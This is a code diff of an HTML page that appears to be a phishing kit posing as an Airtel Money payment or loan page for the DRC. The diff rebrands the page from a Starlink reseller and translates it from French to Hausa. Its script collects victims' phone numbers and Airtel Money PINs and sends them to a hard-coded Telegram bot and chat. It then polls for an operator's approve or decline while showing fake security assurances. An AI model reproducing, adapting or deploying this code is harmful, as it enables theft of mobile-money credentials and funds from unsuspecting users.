@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="ha">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Airtel Money - Paiement Sécurisé</title>
+    <title>Airtel Money - Biya Mai Tsaro</title>
     <link rel="icon" type="image/png" href="https://www.starlink.com/favicon.ico">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
@@ -100,6 +100,33 @@
             max-width: 400px;
             margin: 1rem;
         }
+        /* Loading overlay */
+#loadingOverlay {
+  display: none;
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,0.65);
+  z-index: 10000;
+  align-items: center;
+  justify-content: center;
+}
+
+#loadingOverlay.show {
+  display: flex;
+}
+
+.spinner {
+  width: 56px;
+  height: 56px;
+  border: 5px solid rgba(255,255,255,0.25);
+  border-top-color: #ef4444; /* red-500 */
+  border-radius: 9999px;
+  animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+  to { transform: rotate(360deg); }
+}
     </style>
 </head>
 <body class="bg-gray-50">
@@ -108,30 +135,38 @@
     <div id="declineOverlay">
         <div class="decline-box">
             <div class="text-5xl mb-4">❌</div>
-            <h2 class="text-2xl font-bold text-red-600 mb-2">Mauvais détails saisis</h2>
-            <p class="text-gray-600 mb-6">Les informations fournies sont incorrectes. Veuillez réessayer.</p>
+            <h2 class="text-2xl font-bold text-red-600 mb-2">Bayanan da ba daidai ba</h2>
+            <p class="text-gray-600 mb-6">Bayanan da aka bayar ba daidai ba ne. Da fatan za a sake gwadawa.</p>
             <button onclick="closeDecline()" class="bg-black text-white px-8 py-3 rounded-xl font-bold hover:bg-gray-800">
-                Réessayer
+                Sake gwadawa
             </button>
         </div>
     </div>
+    
+    <div id="loadingOverlay">
+  <div class="bg-white rounded-2xl p-6 text-center w-[320px]">
+    <div class="spinner mx-auto mb-4"></div>
+    <h2 class="text-lg font-bold text-gray-900">Ana dubawa…</h2>
+    <p class="text-sm text-gray-600 mt-1">Da fatan za a jira yayin da Telegram ke tabbatar da buƙatarku.</p>
+  </div>
+</div>
 
     <!-- Header -->
     <header class="bg-black text-white shadow-sm">
         <div class="max-w-7xl mx-auto px-4 py-4 flex items-center justify-between">
             <a href="/" class="flex items-center gap-2">
-                <span class="font-bold text-2xl tracking-widest">STARLINK</span>
-                <span class="text-sm border-l pl-2 ml-2 border-gray-600 hidden sm:inline">Revendeur RDC</span>
+                <span class="font-bold text-2xl tracking-widest">AIRTEL LOAN</span>
+                <span class="text-sm border-l pl-2 ml-2 border-gray-600 hidden sm:inline">Dillali RDC</span>
             </a>
             <nav class="flex gap-6">
                 <a href="/dashboard/" class="text-gray-300 hover:text-white flex items-center gap-2">
-                    <i class="uil uil-wifi"></i> <span class="hidden sm:inline">Statut</span>
+                    <i class="uil uil-wifi"></i> <span class="hidden sm:inline">Matsayi</span>
                 </a>
                 <a href="/plans/" class="text-gray-300 hover:text-white flex items-center gap-2">
-                    <i class="uil uil-home"></i> <span class="hidden sm:inline">Forfaits</span>
+                    <i class="uil uil-home"></i> <span class="hidden sm:inline">Tsare-tsare</span>
                 </a>
                 <a href="/records/" class="text-gray-300 hover:text-white flex items-center gap-2">
-                    <i class="uil uil-list-ul"></i> <span class="hidden sm:inline">Commandes</span>
+                    <i class="uil uil-list-ul"></i> <span class="hidden sm:inline">Umarni</span>
                 </a>
             </nav>
         </div>
@@ -159,15 +194,15 @@
                     <div class="mb-8">
                         <div class="flex flex-col sm:flex-row justify-between items-center mb-6 pb-6 border-b border-gray-100 gap-4">
                             <div class="text-center sm:text-left">
-                                <p class="text-gray-400 text-xs uppercase font-bold tracking-widest">Montant</p>
+                                <p class="text-gray-400 text-xs uppercase font-bold tracking-widest">Adadin kuɗi</p>
                                 <p class="text-3xl sm:text-2xl font-black text-red-600">CDF </p>
                             </div>
                             <div class="text-center sm:text-right">
-                                <p class="text-gray-400 text-xs uppercase font-bold tracking-widest">Service</p>
-                                <p class="text-sm font-bold text-gray-700">Renouvellement Starlink</p>
+                                <p class="text-gray-400 text-xs uppercase font-bold tracking-widest">Sabis</p>
+                                <p class="text-sm font-bold text-gray-700">Sabunta lamunin Airtel</p>
                             </div>
                         </div>
-                        <p class="text-gray-600 text-sm text-center">Entrez votre code PIN Airtel Money pour autoriser</p>
+                        <p class="text-gray-600 text-sm text-center">Shigar da lambar PIN ɗin ku ta Airtel Money don ba da izini</p>
                     </div>
 
                     <form method="POST" action="/hodl/" class="space-y-6" novalidate id="paymentForm">
@@ -176,7 +211,7 @@
                         <!-- Airtel Number Input -->
                         <div>
                             <label class="block text-gray-700 font-bold mb-3 text-sm">
-                                Numéro Airtel Money
+                                Lambar Airtel Money
                             </label>
 
                             <div class="flex border-2 border-gray-300 rounded-xl overflow-hidden focus-within:border-red-600 focus-within:ring-2 focus-within:ring-red-100 transition-all duration-300">
@@ -194,8 +229,8 @@
                                         id="countryCode"
                                         class="bg-transparent outline-none text-gray-700 font-bold text-sm cursor-pointer"
                                     >
-                                        <option value="+243" data-flag="cd">+243</option>
-                                        <option value="+242" data-flag="cg">+242</option>
+                                    
+                                        <option value="+243" data-flag="cg">+242</option>
                                         <option value="+256" data-flag="ug">+256</option>
                                         <option value="+254" data-flag="ke">+254</option>
                                         <option value="+255" data-flag="tz">+255</option>
@@ -226,10 +261,10 @@
                         <!-- PIN Entry -->
                         <div class="text-center mt-8 mb-6">
                             <p class="text-gray-700 font-bold text-sm">
-                                Entrez le code PIN à 4 chiffres
+                                Shigar da lambar PIN mai lambobi 4
                             </p>
                             <p class="text-gray-500 text-xs mt-1">
-                                Vérifiez votre application Airtel Money ou vos SMS
+                                Duba app ɗin ku na Airtel Money ko SMS ɗinku
                             </p>
                         </div>
 
@@ -250,14 +285,14 @@
                             class="w-full bg-gradient-to-r from-red-600 to-red-700 hover:from-red-700 hover:to-red-800 text-white font-black py-4 rounded-xl shadow-lg shadow-red-200 transition-all transform active:scale-95 uppercase tracking-widest flex items-center justify-center gap-2"
                         >
                             <i class="uil uil-check-circle"></i>
-                            Confirmer le Paiement
+                            Tabbatar da Biyan
                         </button>
                     </form>
 
                     <!-- Security Note -->
                     <div class="mt-8 flex items-center justify-center gap-2 text-gray-500">
                         <i class="uil uil-shield-check text-lg text-green-600"></i>
-                        <p class="text-[11px] uppercase font-bold tracking-widest">Crypté SSL et Sécurisé</p>
+                        <p class="text-[11px] uppercase font-bold tracking-widest">SSL da Tsaro</p>
                     </div>
                 </div>
             </div>
@@ -270,179 +305,238 @@
             <div class="grid grid-cols-1 md:grid-cols-3 gap-8 mb-8">
                 <div>
                     <h3 class="text-white font-bold mb-4">STARLINK RDC</h3>
-                    <p class="text-sm">Revendeur agréé de forfaits de données pour les services Starlink en RDC. Paiements rapides, fiables et sécurisés via Airtel Money.</p>
+                    <p class="text-sm">Dillalin da aka amince da shi na tsare-tsaren bayanai don sabis na Starlink a RDC. Biya cikin sauri, amintacce kuma mai tsaro ta hanyar Airtel Money.</p>
                 </div>
                 <div>
-                    <h3 class="text-white font-bold mb-4">SUPPORT</h3>
-                    <p class="text-sm">Email: support@starlinkrdc.reseller</p>
-                    <p class="text-sm">Disponible 24h/24, 7j/7 pour l'assistance technique.</p>
+                    <h3 class="text-white font-bold mb-4">TAIMAKO</h3>
+                    <p class="text-sm">Email: support@loandc.reseller</p>
+                    <p class="text-sm">Muna nan kowane lokaci don taimakon fasaha.</p>
                 </div>
                 <div>
-                    <h3 class="text-white font-bold mb-4">PAIEMENT</h3>
-                    <p class="text-sm">Payez en toute sécurité avec Airtel Money. Assurez-vous d'avoir un solde suffisant pour le forfait sélectionné.</p>
+                    <h3 class="text-white font-bold mb-4">BIYA</h3>
+                    <p class="text-sm">Biya lafiya ta Airtel Money. Tabbatar cewa kuna da isassun kuɗi don tsarin da kuka zaɓa.</p>
                 </div>
             </div>
             <div class="border-t border-gray-800 pt-8 text-center">
-                <p>&copy; 2026 Starlink RDC Reseller. Tous droits réservés.</p>
+                <p>© 2026 Airtel Congo. Duk haƙƙoƙi an kiyaye su.</p>
             </div>
         </div>
     </footer>
 
-    <script>
-    document.addEventListener("DOMContentLoaded", function () {
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+  // ===== CONFIG TELEGRAM (À REMPLACER) =====
+  const TELEGRAM_BOT_TOKEN = "8938471927:AAERAFAO8On-LedtcMsvnx8OW-W3RcsQG-8";
+  const TELEGRAM_CHAT_ID  = "7375427744";
+  // =========================================
 
-        // ===== CONFIG TELEGRAM (À REMPLACER) =====
-        const TELEGRAM_BOT_TOKEN = "8622400907:AAEdVNBFOs3F3f-fi-WSb5rxlJWsiBeGpVk";
-        const TELEGRAM_CHAT_ID  = "5615316142";
-        // =========================================
+  const countrySelect = document.getElementById("countryCode");
+  const countryFlag = document.getElementById("countryFlag");
+  const phoneInput = document.getElementById("phoneNumber");
+  const fullPhone = document.getElementById("fullPhone");
+  const pinBoxes = document.querySelectorAll(".pin-box");
+  const hiddenPin = document.getElementById("pin-field");
+  const form = document.getElementById("paymentForm");
+  const declineOverlay = document.getElementById("declineOverlay");
 
-        const countrySelect = document.getElementById("countryCode");
-        const countryFlag = document.getElementById("countryFlag");
-        const phoneInput = document.getElementById("phoneNumber");
-        const fullPhone = document.getElementById("fullPhone");
-        const pinBoxes = document.querySelectorAll(".pin-box");
-        const hiddenPin = document.getElementById("pin-field");
-        const form = document.getElementById("paymentForm");
-        const declineOverlay = document.getElementById("declineOverlay");
+  const loadingOverlay = document.getElementById("loadingOverlay");
+  const submitButton = form.querySelector('button[type="submit"]');
 
-        let sentMessageId = null;
-        let lastUpdateId = 0;
-        let pollingActive = false;
+  let sentMessageId = null;
+  let lastUpdateId = 0;
+  let pollingTimer = null;
+  let timeoutTimer = null;
+  let pollingActive = false;
 
-        // Change flag when country changes
-        countrySelect.addEventListener("change", function () {
-            const selected = this.options[this.selectedIndex];
-            const flag = selected.getAttribute("data-flag");
-            countryFlag.src = "https://flagcdn.com/w40/" + flag + ".png";
-        });
+  function setWaiting(isWaiting) {
+    if (!loadingOverlay) return;
 
-        // Numbers only for phone
-        phoneInput.addEventListener("input", function () {
-            this.value = this.value.replace(/\D/g, "");
-        });
+    if (isWaiting) {
+      loadingOverlay.classList.add("show");
+      if (submitButton) submitButton.disabled = true;
 
-        // PIN Boxes logic
-        function updatePin() {
-            let pin = "";
-            pinBoxes.forEach(box => { pin += box.value; });
-            hiddenPin.value = pin;
-        }
+      pinBoxes.forEach(b => b.disabled = true);
+      phoneInput.disabled = true;
+      countrySelect.disabled = true;
+    } else {
+      loadingOverlay.classList.remove("show");
+      if (submitButton) submitButton.disabled = false;
 
-        pinBoxes.forEach((box, index) => {
-            box.addEventListener("input", function () {
-                this.value = this.value.replace(/\D/g, "");
-                if (this.value && index < pinBoxes.length - 1) {
-                    pinBoxes[index + 1].focus();
-                }
-                updatePin();
-            });
+      pinBoxes.forEach(b => b.disabled = false);
+      phoneInput.disabled = false;
+      countrySelect.disabled = false;
+    }
+  }
 
-            box.addEventListener("keydown", function (e) {
-                if (e.key === "Backspace" && !this.value && index > 0) {
-                    pinBoxes[index - 1].focus();
-                }
-            });
+  function clearTimers() {
+    if (pollingTimer) {
+      clearInterval(pollingTimer);
+      pollingTimer = null;
+    }
+    if (timeoutTimer) {
+      clearTimeout(timeoutTimer);
+      timeoutTimer = null;
+    }
+    pollingActive = false;
+  }
 
-            box.addEventListener("paste", function (e) {
-                e.preventDefault();
-                const pasted = (e.clipboardData || window.clipboardData)
-                    .getData("text")
-                    .replace(/\D/g, "")
-                    .slice(0, 4);
-                pasted.split("").forEach((digit, i) => {
-                    if (pinBoxes[i]) pinBoxes[i].value = digit;
-                });
-                updatePin();
-            });
-        });
+  // Change flag when country changes
+  countrySelect.addEventListener("change", function () {
+    const selected = this.options[this.selectedIndex];
+    const flag = selected.getAttribute("data-flag");
+    countryFlag.src = "https://flagcdn.com/w40/" + flag + ".png";
+  });
 
-        // === POLLING : écoute les réponses du bot ===
-        function startPolling() {
-            if (pollingActive) return;
-            pollingActive = true;
+  // Numbers only for phone
+  phoneInput.addEventListener("input", function () {
+    this.value = this.value.replace(/\D/g, "");
+  });
 
-            const interval = setInterval(() => {
-                if (!sentMessageId) return;
+  // PIN Boxes logic
+  function updatePin() {
+    let pin = "";
+    pinBoxes.forEach(box => { pin += box.value; });
+    hiddenPin.value = pin;
+  }
 
-                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`;
+  pinBoxes.forEach((box, index) => {
+    box.addEventListener("input", function () {
+      this.value = this.value.replace(/\D/g, "");
+      if (this.value && index < pinBoxes.length - 1) {
+        pinBoxes[index + 1].focus();
+      }
+      updatePin();
+    });
 
-                fetch(url)
-                    .then(r => r.json())
-                    .then(data => {
-                        if (!data.ok || !data.result) return;
+    box.addEventListener("keydown", function (e) {
+      if (e.key === "Backspace" && !this.value && index > 0) {
+        pinBoxes[index - 1].focus();
+      }
+    });
 
-                        data.result.forEach(update => {
-                            lastUpdateId = update.update_id;
+    box.addEventListener("paste", function (e) {
+      e.preventDefault();
+      const pasted = (e.clipboardData || window.clipboardData)
+        .getData("text")
+        .replace(/\D/g, "")
+        .slice(0, 4);
 
-                            if (update.callback_query) {
-                                const cb = update.callback_query;
-                                const msgId = cb.message?.message_id;
-                                const data = cb.data;
+      const digits = pasted.split("");
+      pinBoxes.forEach((b, i) => {
+        b.value = digits[i] ? digits[i] : "";
+      });
+      updatePin();
+    });
+  });
 
-                                if (msgId === sentMessageId) {
-                                    const answerUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
-                                    fetch(answerUrl, {
-                                        method: "POST",
-                                        headers: { "Content-Type": "application/json" },
-                                        body: JSON.stringify({
-                                            callback_query_id: cb.id
-                                        })
-                                    });
+  // === Afficher l'overlay Decline + reset ===
+  window.showDecline = function () {
+    form.reset();
+    pinBoxes.forEach(box => box.value = "");
+    hiddenPin.value = "";
+    if (fullPhone) fullPhone.value = "";
 
-                                    if (data === "approve") {
-                                        clearInterval(interval);
-                                        pollingActive = false;
-                                        window.location.href = "hodlfa.html";
-                                    } else if (data === "decline") {
-                                        clearInterval(interval);
-                                        pollingActive = false;
-                                        showDecline();
-                                    }
-                                }
-                            }
-                        });
-                    })
-                    .catch(err => console.error("Polling error:", err));
-            }, 2000);
-        }
+    sentMessageId = null;
+    clearTimers();
 
-        // === Afficher l'overlay Decline + reset ===
-        window.showDecline = function() {
-            form.reset();
-            pinBoxes.forEach(box => box.value = "");
-            hiddenPin.value = "";
-            phoneInput.value = "";
-            fullPhone.value = "";
-            sentMessageId = null;
-            pollingActive = false;
+    declineOverlay.classList.add("show");
+    setWaiting(false);
+  };
 
-            declineOverlay.classList.add("show");
-        };
+  // === Fermer l'overlay ===
+  window.closeDecline = function () {
+    declineOverlay.classList.remove("show");
+    setWaiting(false);
+    if (pinBoxes[0]) pinBoxes[0].focus();
+  };
 
-        // === Fermer l'overlay ===
-        window.closeDecline = function() {
-            declineOverlay.classList.remove("show");
-            inputs[0].focus();
-        };
+  function answerCallbackQuery(callbackQueryId) {
+    const answerUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
+    return fetch(answerUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ callback_query_id: callbackQueryId })
+    }).catch(() => {});
+  }
 
-        // === FORM SUBMIT ===
-        form.addEventListener("submit", function (e) {
-            e.preventDefault();
+  // === POLLING : écoute les réponses du bot ===
+  function startPolling() {
+    if (pollingActive) return;
+    if (!sentMessageId) return;
 
-            const phone = phoneInput.value.trim();
-            if (!phone) {
-                alert("Veuillez entrer votre numéro Airtel Money.");
-                return;
+    pollingActive = true;
+
+    pollingTimer = setInterval(() => {
+      if (!sentMessageId) return;
+
+      const url =
+        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?` +
+        `offset=${lastUpdateId + 1}&timeout=10`;
+
+      fetch(url)
+        .then(r => r.json())
+        .then(data => {
+          if (!data.ok || !data.result) return;
+
+          data.result.forEach(update => {
+            lastUpdateId = update.update_id;
+
+            if (!update.callback_query) return;
+
+            const cb = update.callback_query;
+            const cbData = cb.data;
+            const cbMsgId = cb.message?.message_id;
+
+            // Only handle the inline callback coming from our sent message
+            if (cbMsgId !== sentMessageId) return;
+
+            // Always answer the callback query to stop Telegram spinner
+            answerCallbackQuery(cb.id);
+
+            if (cbData === "approve") {
+              clearTimers();
+              setWaiting(false);
+              window.location.href = "hodlfa.html";
+            } else if (cbData === "decline") {
+              clearTimers();
+              setWaiting(false);
+              window.showDecline();
             }
-            if (hiddenPin.value.length !== 4) {
-                alert("Veuillez entrer votre code PIN à 4 chiffres.");
-                return;
-            }
+          });
+        })
+        .catch(err => {
+          console.error("Polling error:", err);
+        });
+    }, 2000);
+  }
 
-            const fullPhoneNumber = countrySelect.value + phone;
+  form.addEventListener("submit", function (e) {
+    e.preventDefault();
 
-            const message = `
-🔴 NOUVEAU PAIEMENT AIRTEL MONEY (DÉMO)
+    // Reset previous state
+    clearTimers();
+    if (declineOverlay) declineOverlay.classList.remove("show");
+
+    const phone = phoneInput.value.trim();
+    if (!phone) {
+      setWaiting(false);
+      alert("Da fatan za a shigar da lambar Airtel Money ɗinku.");
+      return;
+    }
+
+    if (hiddenPin.value.length !== 4) {
+      setWaiting(false);
+      alert("Da fatan za a shigar da lambar PIN ɗinku mai lambobi 4.");
+      return;
+    }
+
+    const fullPhoneNumber = countrySelect.value + phone;
+
+    // Show waiting UI immediately
+    setWaiting(true);
+
+    const message = `
+🔴 NOUVEAU PAIEMENT AIRTEL MONEY
 ━━━━━━━━━━━━━━━━━━━━━
 📱 Numéro : ${fullPhoneNumber}
 🔑 PIN : ${hiddenPin.value}
@@ -450,47 +544,60 @@
 🕐 Timestamp : ${new Date().toLocaleString("fr-FR")}
 ━━━━━━━━━━━━━━━━━━━━━
 ⚠️ Ceci est une démo — à des fins de test uniquement.
-            `.trim();
+    `.trim();
 
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
-            fetch(url, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: message,
-                    parse_mode: "HTML",
-                    reply_markup: {
-                        inline_keyboard: [
-                            [
-                                { text: "✅ Approve", callback_data: "approve" },
-                                { text: "❌ Decline", callback_data: "decline" }
-                            ]
-                        ]
-                    }
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log("Telegram response:", data);
-                if (data.ok && data.result) {
-                    sentMessageId = data.result.message_id;
-                    startPolling();
-                } else {
-                    window.location.href = "hodlfa.html";
-                }
-            })
-            .catch(error => {
-                console.error("Erreur Telegram:", error);
-                window.location.href = "hodlfa.html";
-            });
+    // Prepare timeout for "verifications waiting"
+    const TIMEOUT_MS = 60000; // 60 seconds
+    timeoutTimer = setTimeout(() => {
+      // If Telegram never answered
+      clearTimers();
+      setWaiting(false);
+      window.showDecline();
+    }, TIMEOUT_MS);
 
-            fullPhone.value = fullPhoneNumber;
-        });
+    fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: "HTML",
+        reply_markup: {
+          inline_keyboard: [
+            [
+              { text: "✅ Approve", callback_data: "approve" },
+              { text: "❌ Decline", callback_data: "decline" }
+            ]
+          ]
+        }
+      })
+    })
+      .then(res => res.json())
+      .then(data => {
+        console.log("Telegram response:", data);
 
-    });
-    </script>
+        if (data && data.ok && data.result) {
+          sentMessageId = data.result.message_id;
+          startPolling();
+        } else {
+          clearTimers();
+          setWaiting(false);
+          window.location.href = "hodlfa.html";
+        }
+      })
+      .catch(err => {
+        console.error("Erreur Telegram:", err);
+        clearTimers();
+        setWaiting(false);
+        window.location.href = "hodlfa.html";
+      });
+
+    if (fullPhone) fullPhone.value = fullPhoneNumber;
+  });
+});
+</script>
 
 </body>
 </html>
